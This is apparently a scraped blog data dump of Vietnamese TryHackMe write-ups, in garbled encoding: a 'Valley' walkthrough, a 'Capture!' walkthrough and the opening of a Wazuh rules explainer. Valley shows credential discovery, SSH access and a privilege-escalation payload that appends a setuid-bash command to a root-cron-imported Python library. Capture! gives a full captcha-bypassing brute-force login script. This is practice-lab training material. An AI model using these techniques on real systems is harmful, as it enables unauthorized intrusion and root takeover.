static\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# gobuster dir -u http://10.10.35.151/static/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.35.151/static/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/07/23 03:16:05 Starting gobuster in directory enumeration mode =============================================================== /00 (Status: 200) [Size: 127] /3 (Status: 200) [Size: 421858] /11 (Status: 200) [Size: 627909] /5 (Status: 200) [Size: 1426557] TÃ´i cÃ³ thÃªm path /00. Truy cáº­p nÃ³ vÃ  tÃ´i cÃ³ vÃ i dÃ²ng note\ndev notes from valleyDev: -add wedding photo examples -redo the editing on #4 -remove /dev1243224123123 -check for SIEM alerts TÃ´i cÃ³ 1 path má»›i lÃ  /dev1243224123123. Truy cáº­p vÃ o vÃ  tÃ´i cÃ³ 1 form Ä‘Äƒng nháº­p. Thá»­ vÃ o xem source cá»§a nÃ³\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script defer src=\u0026#34;dev.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script defer src=\u0026#34;button.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;main id=\u0026#34;main-holder\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;login-header\u0026#34;\u0026gt;Valley Photo Co. Dev Login\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;login-error-msg-holder\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;login-error-msg\u0026#34;\u0026gt;Invalid username \u0026lt;span id=\u0026#34;error-msg-second-line\u0026#34;\u0026gt;and/or password\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form id=\u0026#34;login-form\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username-field\u0026#34; class=\u0026#34;login-form-field\u0026#34; placeholder=\u0026#34;Username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password-field\u0026#34; class=\u0026#34;login-form-field\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34; id=\u0026#34;login-form-submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;button id=\u0026#34;homeButton\u0026#34;\u0026gt;Back to Homepage\u0026lt;/button\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; KhÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t, tuy nhiÃªn tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 script tÃªn dev.js\nconst loginForm = document.getElementById(\u0026#34;login-form\u0026#34;); const loginButton = document.getElementById(\u0026#34;login-form-submit\u0026#34;); const loginErrorMsg = document.getElementById(\u0026#34;login-error-msg\u0026#34;); loginForm.style.border = \u0026#39;2px solid #ccc\u0026#39;; loginForm.style.padding = \u0026#39;20px\u0026#39;; loginButton.style.backgroundColor = \u0026#39;#007bff\u0026#39;; loginButton.style.border = \u0026#39;none\u0026#39;; loginButton.style.borderRadius = \u0026#39;5px\u0026#39;; loginButton.style.color = \u0026#39;#fff\u0026#39;; loginButton.style.cursor = \u0026#39;pointer\u0026#39;; loginButton.style.padding = \u0026#39;10px\u0026#39;; loginButton.style.marginTop = \u0026#39;10px\u0026#39;; function isValidUsername(username) { if(username.length \u0026lt; 5) { console.log(\u0026#34;Username is valid\u0026#34;); } else { console.log(\u0026#34;Invalid Username\u0026#34;); } } function isValidPassword(password) { if(password.length \u0026lt; 7) { console.log(\u0026#34;Password is valid\u0026#34;); } else { console.log(\u0026#34;Invalid Password\u0026#34;); } } function showErrorMessage(element, message) { const error = element.parentElement.querySelector(\u0026#39;.error\u0026#39;); error.textContent = message; error.style.display = \u0026#39;block\u0026#39;; } loginButton.addEventListener(\u0026#34;click\u0026#34;, (e) =\u0026gt; { e.preventDefault(); const username = loginForm.username.value; const password = loginForm.password.value; if (username === \u0026#34;siemDev\u0026#34; \u0026amp;\u0026amp; password === \u0026#34;california\u0026#34;) { window.location.href = \u0026#34;/dev1243224123123/devNotes37370.txt\u0026#34;; } else { loginErrorMsg.style.opacity = 1; } }) á» pháº§n cuá»‘i tÃ´i cÃ³ username vÃ  password, thÃªm cáº£ 1 path má»›i. Truy cáº­p vÃ o nÃ³ vÃ  tÃ´i cÃ³ gá»£i Ã½ tiáº¿p theo\ndev notes for ftp server: -stop reusing credentials -check for any vulnerabilies -stay up to date on patching -change ftp port to normal port á»Ÿ Ä‘Ã¢y cÃ³ nháº¯c Ä‘áº¿n ftp. TÃ´i sáº½ quay láº¡i port ftp vÃ  thá»­ dÃ¹ng username vÃ  password phÃ­a trÃªn Ä‘á»ƒ login\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads] â””â”€# ftp 10.10.35.151 37370 Connected to 10.10.35.151. 220 (vsFTPd 3.0.3) Name (10.10.35.151:kali): siemDev 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||54959|) 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 7272 Mar 06 13:55 siemFTP.pcapng -rw-rw-r-- 1 1000 1000 1978716 Mar 06 13:55 siemHTTP1.pcapng -rw-rw-r-- 1 1000 1000 1972448 Mar 06 14:06 siemHTTP2.pcapng 226 Directory send OK. ftp\u0026gt; Táº£i 3 file pcap nÃ y vá» vÃ  dÃ¹ng Wireshark Ä‘á»ƒ phÃ¢n tÃ­ch.\nSau má»™t lÃºc khÃ¡ lÃ¢u thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m tháº¥y thá»© mÃ¬nh cáº§n trong file siemHTTP2.pcapng\nPOST /index.html HTTP/1.1 Host: 192.168.111.136 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 42 Origin: http://192.168.111.136 Connection: keep-alive Referer: http://192.168.111.136/index.html Upgrade-Insecure-Requests: 1 uname=valleyDev\u0026amp;psw=ph0t0s1234\u0026amp;remember=onHTTP/1.1 200 OK Date: Mon, 06 Mar 2023 21:05:08 GMT Server: Apache/2.4.55 (Debian) Last-Modified: Mon, 06 Mar 2023 20:46:17 GMT ETag: \u0026#34;2fc-5f64162f52399-gzip\u0026#34; Accept-Ranges: bytes Vary: Accept-Encoding Content-Encoding: gzip Content-Length: 369 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html ...........RMO.0...WX..UpDi.Bp.0!qFI....$$.\u0026gt;.=I..m P........|c}.BQgM.:S.a.R...H..K.l V-.x..@i.Bl..e .....X.9.^....\t..n.L.@h*.c...al....\\-.(~.k!QC.[....Y.e...../d...2.1n .........Baku.....z..3H...\u0026lt;~...:...va...Q....ob7u.J.\u0026gt;.G....Z.D.Lpa.}..x.Mg\u0026#34;s...g..D...V.C.}...Rxb..c/...m ..#..l.....:.I......o..../7......i\u0026lt;....F..dX....)..f..V.X.X.....)..U...x!.7...|^.\u0026#39;_...Q?.%....GET /img_avatar2. HTTP/1.1 Host: 192.168.111.136 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: image/avif,image/,*/* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://192.168.111.136/index.html HTTP/1.1 404 Not Found Date: Mon, 06 Mar 2023 21:05:09 GMT Server: Apache/2.4.55 (Debian) Content-Length: 277 Keep-Alive: timeout=5, max=99 Connection: Keep-Alive Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on this server.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.55 (Debian) Server at 192.168.111.136 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; SSH # Thá»­ nháº­p username vÃ  password nÃ y vÃ o pháº§n login trÃªn trang web nhÆ°ng khÃ´ng Ä‘Æ°á»£c, vÃ o ftp cÅ©ng khÃ´ng Ä‘Æ°á»£c. Váº­y thÃ¬ chá»‰ cÃ²n ssh trÃªn port 22\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads] â””â”€# ssh valleyDev@10.10.35.151 The authenticity of host \u0026#39;10.10.35.151 (10.10.35.151)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.35.151\u0026#39; (ED25519) to the list of known hosts. valleyDev@10.10.35.151\u0026#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Introducing Expanded Security Maintenance for Applications. Receive updates to over 25,000 software packages with your Ubuntu Pro subscription. Free for personal use. https://ubuntu.com/pro valleyDev@valley:~$ id uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev) valleyDev@valley:~$ user flag\nvalleyDev@valley:~$ ls user.txt valleyDev@valley:~$ cat user.txt THM{k@l1_1n_th3_v@lley} valleyDev@valley:~$ Privilege escalation # valleyDev@valley:/home$ ls -la total 752 drwxr-xr-x 5 root root 4096 Mar 6 13:19 . drwxr-xr-x 21 root root 4096 Mar 6 15:40 .. drwxr-x--- 4 siemDev siemDev 4096 Mar 20 20:03 siemDev drwxr-x--- 16 valley valley 4096 Mar 20 20:54 valley -rwxrwxr-x 1 valley valley 749128 Aug 14 2022 valleyAuthenticator drwxr-xr-x 6 valleyDev valleyDev 4096 Jul 23 08:20 valleyDev valleyDev@valley:/home$ á» Ä‘Ã¢y cÃ³ 1 file thá»±c thi kiá»ƒm tra password cho username. NhÆ°ng cho dÃ¹ tÃ´i cÃ³ nháº­p Ä‘Ãºng password cá»§a user nÃ o thÃ¬ nÃ³ váº«n ra káº¿t quáº£ sai\nvalleyDev@valley:/home$ ./valleyAuthenticator Welcome to Valley Inc. Authenticator What is your username: valleyDev What is your password: ph0t0s1234 Wrong Password or Username valleyDev@valley:/home$ Váº­y ráº¥t cÃ³ kháº£ nÄƒng trong file thá»±c thi nÃ y cÃ³ chá»©a password vÃ  username khÃ¡c mÃ  tÃ´i chÆ°a biáº¿t. Váº­y nÃªn tÃ´i sao chÃ©p nÃ³ vá» mÃ¡y vÃ  phÃ¢n tÃ­ch\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# strings valleyAuthenticator NÃ³ ráº¥t, ráº¥t dÃ i. Sau 1 lÃºc kÃ©o vÃ  xem háº¿t nÃ³ má»™t cÃ¡ch chi tiáº¿t thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c thá»© mÃ¬nh cáº§n\ne6722920bab2326f8217e4 bf6b1b58ac ddJ1cc76ee3 beb60709056cfbOW elcome to Valley Inc. Authentica [k0rHh is your usernad DÃ£y Ä‘áº§u tiÃªn cÃ³ thá»ƒ lÃ  md5. TÃ´i sá»­ dá»¥ng crackstation vÃ  tÃ¬m Ä‘Æ°á»£c password lÃ  liberty123. Thá»­ vá»›i cÃ¡c user cÃ²n láº¡i\nvalleyDev@valley:~$ su valley Password: valley@valley:~$ id uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin) valley@valley:~$ User nÃ y náº±m trong 1 group khÃ¡c lÃ  valleyAdmin. TÃ´i sáº½ thá»­ tÃ¬m cÃ¡c file thuá»™c group nÃ y xem cÃ³ gÃ¬ Ä‘áº·c biá»‡t khÃ´ng\nvalley@valley:~$ find / -type f -group valleyAdmin -ls 2\u0026gt;/dev/null 263097 20 -rwxrwxr-x 1 root valleyAdmin 20382 Mar 13 03:26 /usr/lib/python3.8/base64.py valley@valley:~$ Váº­y lÃ  tÃ´i cÃ³ 1 file thuá»™c sá»Ÿ há»¯u cá»§a root nhÆ°ng náº±m trong group valleyAdmin. Váº­y thÃ¬ tÃ´i sáº½ thÃªm payload nÃ y vÃ o file trÃªn\nimport os; os.system(\u0026#34;cp /bin/bash /tmp/bash \u0026amp;\u0026amp; chmod +s /tmp/bash\u0026#34;) Tuy nhiÃªn Ä‘á»ƒ file nÃ y cÃ³ thá»ƒ cháº¡y Ä‘Æ°á»£c, tÃ´i cáº§n há»‡ thá»‘ng cháº¡y 1 file python nÃ o Ä‘Ã³ vÃ  cÃ³ import thÆ° viá»‡n base64. VÃ  sau khi tÃ¬m kiáº¿m 1 lÃºc thÃ¬ tÃ´i Ä‘Ã£ tháº¥y nÃ³ trong pháº§n crontab\nExample of job definition: .---------------- minute (0 - 59) | .------------- hour (0 - 23) | | .---------- day of month (1 - 31) | | | .------- month (1 - 12) OR jan,feb,mar,apr ... | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat | | | | | * * * * * user-name command to be executed 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) 1 * * * * root python3 /photos/script/photosEncrypt.py Äiá»u nÃ y cÃ³ nghÄ©a lÃ  root Ä‘Æ°á»£c Ä‘áº·t lá»‹ch Ä‘á»ƒ cháº¡y tá»± Ä‘á»™ng file photosEncrypt.py. Kiá»ƒm tra file nÃ y\n#!/usr/bin/python3 import base64 for i in range(1,7): # specify the path to the image file you want to encode image_path = \u0026#34;/photos/p\u0026#34; + str(i) + \u0026#34;.jpg\u0026#34; # open the image file and read its contents with open(image_path, \u0026#34;rb\u0026#34;) as image_file: image_data = image_file.read() # encode the image data in Base64 format encoded_image_data = base64.b64encode(image_data) # specify the path to the output file output_path = \u0026#34;/photos/photoVault/p\u0026#34; + str(i) + \u0026#34;.enc\u0026#34; # write the Base64-encoded image data to the output file with open(output_path, \u0026#34;wb\u0026#34;) as output_file: output_file.write(encoded_image_data) CÃ³ import base64. Váº­y thÃ¬ chá»‰ cáº§n thÃªm payload phÃ­a trÃªn vÃ o file base64.py vÃ  chá» 1 lÃºc\nvalley@valley:~$ echo \u0026#39;import os; os.system(\u0026#34;cp /bin/bash /tmp/bash \u0026amp;\u0026amp; chmod +s /tmp/bash\u0026#34;)\u0026#39; \u0026gt;\u0026gt; /usr/lib/python3.8/base64.py Kiá»ƒm tra láº¡i thÆ° má»¥c /tmp\nvalley@valley:~$ ls -la /tmp/ total 1220 drwxrwxrwt 16 root root 4096 Jul 23 09:57 . drwxr-xr-x 21 root root 4096 Mar 6 15:40 .. -rwsr-sr-x 1 root root 1183448 Jul 23 09:58 bash drwxrwxrwt 2 root root 4096 Jul 23 07:47 .font-unix drwxrwxrwt 2 root root 4096 Jul 23 07:47 .ICE-unix srwxrwxr-x 1 valleyDev valleyDev 0 Jul 23 08:21 \u0026#39;rspdpxqzdi;uid=0;\u0026#39; drwx------ 2 root root 4096 Jul 23 07:47 snap-private-tmp drwx------ 3 root root 4096 Jul 23 07:47 systemd-private-205e6587105240bea60eba682b3af138-apache2.service-FOOpTi drwx------ 3 root root 4096 Jul 23 09:54 systemd-private-205e6587105240bea60eba682b3af138-fwupd.service-U4qAGh drwx------ 3 root root 4096 Jul 23 07:47 systemd-private-205e6587105240bea60eba682b3af138-ModemManager.service-drZerj drwx------ 3 root root 4096 Jul 23 07:47 systemd-private-205e6587105240bea60eba682b3af138-systemd-logind.service-z7Rsth drwx------ 3 root root 4096 Jul 23 07:47 systemd-private-205e6587105240bea60eba682b3af138-systemd-resolved.service-gQhb0h drwx------ 3 root root 4096 Jul 23 07:47 systemd-private-205e6587105240bea60eba682b3af138-systemd-timesyncd.service-XtzeHg drwx------ 3 root root 4096 Jul 23 09:54 systemd-private-205e6587105240bea60eba682b3af138-upower.service-2QJCNh drwxrwxrwt 2 root root 4096 Jul 23 07:47 .Test-unix drwxrwxrwt 2 root root 4096 Jul 23 07:47 VMwareDnD drwxrwxrwt 2 root root 4096 Jul 23 07:47 .X11-unix drwxrwxrwt 2 root root 4096 Jul 23 07:47 .XIM-unix valley@valley:~$ NÃ³ Ä‘Ã¢y rá»“i\nvalley@valley:~$ /tmp/bash -p bash-5.0# id uid=1000(valley) gid=1000(valley) euid=0(root) egid=0(root) groups=0(root),1000(valley),1003(valleyAdmin) bash-5.0# cat /root/root.txt THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc} bash-5.0# ","date":"23 July 2023","externalUrl":null,"permalink":"/ctf/tryhackme/valley/","section":"Ctf","summary":"","title":"Tryhackme - Valley","type":"ctf"},{"content":"","date":"23 July 2023","externalUrl":null,"permalink":"/tags/wireshark/","section":"Tags","summary":"","title":"Wireshark","type":"tags"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/tags/captcha/","section":"Tags","summary":"","title":"Captcha","type":"tags"},{"content":"TryHackMe - Capture!\nReconnaissance and Scanning # Ngay á»Ÿ Task 1 tÃ´i Ä‘Ã£ Ä‘Æ°á»£c cung cáº¥p 1 thÆ° má»¥c chá»©a 2 file lÃ  danh sÃ¡ch usernames vÃ  passwords, cÃ³ thá»ƒ nghÄ© ngay Ä‘áº¿n viá»‡c sá»­ dá»¥ng 2 list nÃ y Ä‘á»ƒ brute-force.\nBÃ i nÃ y cÅ©ng khÃ´ng cáº§n thiáº¿t pháº£i scan port vÃ¬ á»Ÿ pháº§n mÃ´ táº£ Ä‘Ã£ cho tÃ´i sáºµn pháº£i truy cáº­p vÃ o http://MACHINE-IP, nghÄ©a lÃ  chá»‰ cÃ³ port 80 Ä‘ang má»Ÿ.\nSau khi cháº¡y mÃ¡y vÃ  truy cáº­p vÃ o web tÃ´i Ä‘Æ°á»£c 1 site login.\nSau khi thá»­ login vÃ i láº§n thÃ¬ tÃ´i bá»‹ dÃ­nh captcha. Váº­y lÃ  web cÃ³ cÆ¡ cháº¿ rate limit Ä‘á»ƒ trÃ¡nh brute-force. Tuy nhiÃªn, captcha nÃ y chá»‰ lÃ  cÃ¡c phÃ©p tÃ­nh cá»™ng trá»« nhÃ¢n chia cÃ¡c sá»‘ tá»± nhiÃªn, váº­y nÃªn tÃ´i cÃ³ thá»ƒ nghÄ© Ä‘áº¿n viá»‡c viáº¿t python script Ä‘á»ƒ bypass captcha nÃ y trong má»—i phiÃªn brute-force.\nPython script # Vá»›i sá»± giÃºp Ä‘Ã£ cá»§a ChatGPT, tÃ´i cÃ³ thá»ƒ viáº¿t láº¡i script nhÆ° sau.\nImport requests Ä‘á»ƒ láº¥y Session, sá»­ dá»¥ng Ä‘á»ƒ brute force, import thÃªm re Ä‘á»ƒ sá»­ dá»¥ng cÃ¡c biá»ƒu thá»©c chÃ­nh quy.\nÄáº§u tiÃªn tÃ´i cáº§n pháº£i láº¥y tá»«ng dÃ²ng trong 2 file usernames.txt vÃ  passwords.txt ra Ä‘á»ƒ lÃ m username vÃ  password, loáº¡i bá» dáº¥u xuá»‘ng dÃ²ng, chá»‰ láº¥y Ä‘Ãºng pháº§n text trong tá»«ng dÃ²ng.\nThÃªm url Ä‘á»ƒ thá»±c hiá»‡n POST request.\n#! /usr/bin/python from requests import Session import re url = \u0026#34;http://10.10.140.153/login\u0026#34; usernames = open(\u0026#39;usernames.txt\u0026#39;,\u0026#39;r\u0026#39;).read().splitlines() passwords = open(\u0026#39;passwords.txt\u0026#39;,\u0026#39;r\u0026#39;).read().splitlines() Khi Ä‘Äƒng nháº­p sai, trang web hiá»‡n Error: The user does not exist.\nVáº­y thÃ¬ tÃ´i sáº½ brute force username trÆ°á»›c báº±ng cÃ¡ch kiá»ƒm tra xem khi nÃ o dá»¯ liá»‡u tráº£ vá» khÃ´ng chá»©a Ä‘oáº¡n kÃ½ tá»± does not exist, Ä‘Ã³ lÃ  username há»£p lá»‡ cáº§n tÃ¬m.\nfor user in usernames: response = session.post(url,data=data) data[\u0026#39;username\u0026#39;] = user if \u0026#39;does not exist\u0026#39; not in response.text: print(f\u0026#39;Found username: {user}\u0026#39;) print(f\u0026#39;Attempting to brute forcing passowrd for user: {user}\u0026#39;) Tiáº¿p theo, cáº§n cÃ³ thÃªm 1 hÃ m Ä‘á»ƒ giáº£i captcha sau má»—i phiÃªn Ä‘Äƒng nháº­p sai. Sá»­ dá»¥ng biá»ƒu thá»©c chÃ­nh quy Ä‘á»ƒ Ä‘á»‹nh dáº¡ng phÃ©p tÃ­nh cá»§a captcha.\n(\\s\\s\\d+\\s[+*-/]\\s\\d+)\\s\\=\\s\\? Sá»­ dá»¥ng hÃ m complie() Ä‘á»ƒ Ä‘á»c biá»ƒu thá»©c chÃ­nh quy trÃªn. Sá»­ dá»¥ng hÃ m findall() tráº£ vá» táº¥t cáº£ káº¿t quáº£ khá»›p vá»›i máº«u trong chuá»—i. Sá»­ dá»¥ng hÃ m eval() Ä‘á»ƒ tráº£ vá» káº¿t quáº£ mÃ  biá»ƒu thá»©c phÃ­a trÃªn thá»±c hiá»‡n.\ndef solve_captcha(response): captcha_syntax = re.compile(r\u0026#39;(\\s\\s\\d+\\s[+*-/]\\s\\d+)\\s\\=\\s\\?\u0026#39;) captcha = captcha_syntax.findall(response) return eval(\u0026#39; \u0026#39;.join(captcha)) Cuá»‘i cÃ¹ng, tÃ´i sáº½ ghÃ©p cÃ¡c pháº§n láº¡i vá»›i nhau. Äáº§u tiÃªn, táº¡o post session chá»©a data lÃ  username vÃ  password.\nNáº¿u trong response tráº£ vá» khÃ´ng cÃ³ chá»©a Ä‘oáº¡n kÃ½ tá»± does not exist, Ä‘Ã³ lÃ  username há»£p lá»‡ cáº§n tÃ¬m Náº¿u trong response tráº£ vá» cÃ³ chá»©a Ä‘oáº¡n kÃ½ tá»± Captcha enabled thÃ¬ gá»i hÃ m solve_captcha Ä‘á»ƒ xá»­ lÃ½. Náº¿u trong response tráº£ vá» khÃ´ng cÃ³ chá»©a Ä‘oáº¡n kÃ½ tá»± Error, Ä‘Ã³ lÃ  password há»£p lá»‡ cáº§n tÃ¬m Script cuá»‘i cÃ¹ng cá»§a tÃ´i sáº½ trÃ´ng nhÆ° tháº¿ nÃ y\n#! /usr/bin/python from requests import Session import re url = \u0026#34;http://10.10.140.153/login\u0026#34; # Removing the line feed (\\n) from the usernames and passwords read from the respective files usernames = open(\u0026#39;username.txt\u0026#39;,\u0026#39;r\u0026#39;).read().splitlines() passwords = open(\u0026#39;password.txt\u0026#39;, \u0026#39;r\u0026#39;).read().splitlines() def solve_captcha(response): captcha_syntax = re.compile(r\u0026#39;(\\s\\s\\d+\\s[+*-/]\\s\\d+)\\s\\=\\s\\?\u0026#39;) captcha = captcha_syntax.findall(response) return eval(\u0026#39; \u0026#39;.join(captcha)) #initializing a session session = Session() data = {\u0026#39;username\u0026#39;: \u0026#39;username\u0026#39;,\u0026#39;password\u0026#39;:\u0026#39;password\u0026#39;} # create a post request to the url with the payload/data using the session opened response = session.post(url,data=data) for user in usernames: response = session.post(url,data=data) data[\u0026#39;username\u0026#39;] = user if \u0026#39;Captcha enabled\u0026#39; in response.text: captcha_result = solve_captcha(response.text) data[\u0026#39;captcha\u0026#39;] = captcha_result response = session.post(url,data =data) if \u0026#39;does not exist\u0026#39; not in response.text: print(f\u0026#39;Found username: {user}\u0026#39;) print(f\u0026#34;Trying brute force passowrd for user: {user}\u0026#34;) for password in passwords: captcha_result = solve_captcha(response.text) data[\u0026#39;password\u0026#39;] = password data[\u0026#39;captcha\u0026#39;] = captcha_result response = session.post(url,data=data) if \u0026#39;Error\u0026#39; not in response.text: print(f\u0026#39;----\u0026gt; Found Username: {user} Password: {password} \u0026#39;) exit() else: print(f\u0026#39;[*]Trying password: {password} for user \u0026#39;) else: print(f\u0026#39;[*] Trying brute force password for user: {user}\u0026#39;) Káº¿t quáº£\n[*]Trying password: 147258369 for user [*]Trying password: fernandez for user [*]Trying password: sakura for user [*]Trying password: robbie for user [*]Trying password: qwert for user [*]Trying password: shaggy for user [*]Trying password: 123654789 for user [*]Trying password: popcorn for user [*]Trying password: martha for user [*]Trying password: dance for user [*]Trying password: brooke for user [*]Trying password: 147852369 for user ----\u0026gt; Found Username: natalie Password: sk8board â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# Login site\n","date":"21 June 2023","externalUrl":null,"permalink":"/ctf/tryhackme/capture/","section":"Ctf","summary":"","title":"Tryhackme - Capture!","type":"ctf"},{"content":"","date":"2 June 2023","externalUrl":null,"permalink":"/tags/siem/","section":"Tags","summary":"","title":"Siem","type":"tags"},{"content":"","date":"2 June 2023","externalUrl":null,"permalink":"/soc/","section":"SOC","summary":"","title":"SOC","type":"soc"},{"content":" Ruleset # LÃ  gÃ¬? Äá»ƒ lÃ m gÃ¬? # Sau khi Ä‘Ã£ biÃªn dá»‹ch log Ä‘á»ƒ Wazuh cÃ³ thá»ƒ hiá»ƒu Ä‘Æ°á»£c log cá»§a chÃºng ta Ä‘ang \u0026ldquo;nÃ³i\u0026rdquo; gÃ¬, viá»‡c tiáº¿p theo lÃ  lÃ m cho nÃ³ hiá»‡n lÃªn mÃ n hÃ¬nh (dashboard) cá»§a chÃºng ta. KhÃ´ng pháº£i táº¥t cáº£ cÃ¡c log Wazuh nháº­n Ä‘Æ°á»£c sáº½ Ä‘á»u hiá»ƒn thá»‹ lÃªn mÃ n hÃ¬nh, viá»‡c nÃ y sáº½ gÃ¢y loÃ£ng thÃ´ng tin, lÃ m cho quáº£n trá»‹ viÃªn máº¥t ráº¥t nhiá»u thá»i gian Ä‘á»ƒ quáº£n lÃ½ cÅ©ng nhÆ° xÃ¡c Ä‘á»‹nh Ä‘Ãºng hiá»ƒm há»a Ä‘ang xáº£y ra Ä‘á»‘i vá»›i tá»• chá»©c cá»§a mÃ¬nh.\nViá»‡c viáº¿t rule chÃ­nh lÃ  Ä‘á»ƒ \u0026ldquo;nÃ³i\u0026rdquo; cho Wazuh biáº¿t log nÃ o cáº§n hiá»ƒn thá»‹, hiá»ƒn thá»‹ nÃ³ nhÆ° tháº¿ nÃ o vÃ  quan trá»ng nháº¥t lÃ  dá»±a vÃ o decoder nÃ o.\nCÅ©ng giá»‘ng nhÆ° decoder con phá»¥ thuá»™c vÃ o decoder cha, rule khi Ä‘Æ°á»£c viáº¿t ra cÅ©ng pháº£i dá»±a trÃªn decoder cha. VÃ¬ Wazuh \u0026ldquo;lÃ m viá»‡c\u0026rdquo; vá»›i decoder chá»© khÃ´ng pháº£i log, váº­y nÃªn náº¿u khÃ´ng theo decoder nÃ o thÃ¬ rule Ä‘Ã³ khÃ´ng cÃ³ ná»™i dung vÃ  cÅ©ng khÃ´ng cÃ³ Ã½ nghÄ©a.\nGiá»‘ng nhÆ° Decoder, Rules cÅ©ng cÃ³ nhá»¯ng tÃ¹y chá»n Ä‘á»ƒ Ä‘á»‹nh cáº¥u hÃ¬nh. Documentation cá»§a Wazuh Ä‘Ã£ Ä‘á»‹nh nghÄ©a táº¥t cáº£ cÃ¡c tÃ¹y chá»n cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng trong khi viáº¿t rules. Tuy nhiÃªn tÃ´i cÅ©ng sáº½ liá»‡t kÃª nhá»¯ng gÃ¬ tÃ´i hay dÃ¹ng nháº¥t.\nOption Values Description rule báº£ng Táº¡o rule má»›i vÃ  cÃ¡c tÃ¹y chá»n bÃªn trong nÃ³ match regex Kiá»ƒm tra xem trong log cÃ³ chá»©a kÃ½ tá»± (sá»­ dá»¥ng sregex) trÃ¹ng vá»›i kÃ½ tá»± Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh hay khÃ´ng regex regex,sregexÂ hoáº·cÂ pcre2 Giá»‘ng vá»›i match, nhÆ°ng sá»­ dá»¥ng regex decoded_as 